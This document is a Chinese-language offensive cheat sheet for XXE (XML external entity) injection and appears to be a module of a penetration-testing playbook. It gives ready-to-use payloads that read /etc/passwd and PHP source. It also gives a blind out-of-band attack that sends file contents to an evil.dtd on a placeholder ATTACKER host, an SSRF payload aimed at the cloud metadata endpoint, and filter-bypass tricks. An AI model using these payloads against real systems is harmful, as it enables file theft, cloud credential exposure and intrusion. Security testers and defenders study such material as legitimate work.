# XXE

> **TECH：** XML 外部实体 → 读文件 / OOB / 转 SSRF
> **成功：** 读到目标文件或 OOB 带回数据；能转 SSRF 则继续 ssrf.md 打到执行

## XXE 外部实体注入

场景：接收XML的接口(Content-Type: application/xml)、SOAP、SAML、SVG/docx/xlsx上传、RSS。

### 有回显 — 读文件

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

### 读PHP源码（特殊字符会破坏XML，用filter转base64）

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
```

### 盲XXE — OOB外带

攻击机放 `http://ATTACKER/evil.dtd`：
```xml
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER/?x=%f;'>">
%all;
```

目标提交：
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext;]>
<root>1</root>
```

攻击机web日志收到 `/?x=root:x:0:0...` → 外带成功。

### 报错型XXE

把文件内容塞进不存在的实体路径触发报错，报错栈带出内容。

### JSON接口转XML

很多JSON接口也接受XML：改 Content-Type 为 application/xml，body换成XML重发。

### XXE打SSRF

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><name>&xxe;</name></root>
```

### 绕过

```
DOCTYPE被过滤 → 参数实体 / UTF-16编码
ENTITY被过滤 → CDATA包裹
```

---

